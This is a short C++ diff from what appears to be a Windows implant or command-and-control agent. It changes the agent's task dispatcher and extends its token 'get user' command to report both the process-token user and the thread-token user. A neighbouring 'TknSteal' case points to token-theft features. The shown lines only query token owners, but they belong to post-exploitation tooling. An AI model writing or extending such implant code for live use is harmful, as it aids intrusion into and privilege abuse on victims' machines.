@@ -73,7 +73,7 @@ auto DECLFN Task::Dispatcher(VOID) -> VOID {
                 );
 
                 JOBS* NewJob = Self->Jbs->Create( TaskUUID, Parser );
-                if (!NewJob) {
+                if ( ! NewJob ) {
                     KhDbg("WARNING: Failed to create job for task %d", i);
                     continue;
                 }
@@ -1158,7 +1158,8 @@ auto DECLFN Task::Token(
     switch ( SubID ) {
         case TknGetUUID: {
             CHAR*  ProcUser    = nullptr;
-            HANDLE TokenHandle = Self->Tkn->Current();
+            CHAR*  ThreadUser  = nullptr;
+            HANDLE TokenHandle = Self->Tkn->CurrentPs();
 
             ProcUser = Self->Tkn->GetUser( TokenHandle );
 
@@ -1169,7 +1170,18 @@ auto DECLFN Task::Token(
 
                 KhSetError( ERROR_SUCCESS );
             }
+
+            TokenHandle = Self->Tkn->CurrentThread();
+            ThreadUser  = Self->Tkn->GetUser( TokenHandle );
             
+            if ( ThreadUser ) {
+                Self->Pkg->Str( Package, ThreadUser );
+                Self->Hp->Free( ThreadUser );
+                Self->Ntdll.NtClose( TokenHandle );
+
+                KhSetError( ERROR_SUCCESS );
+            }
+
             break;
         }
         case TknSteal: {
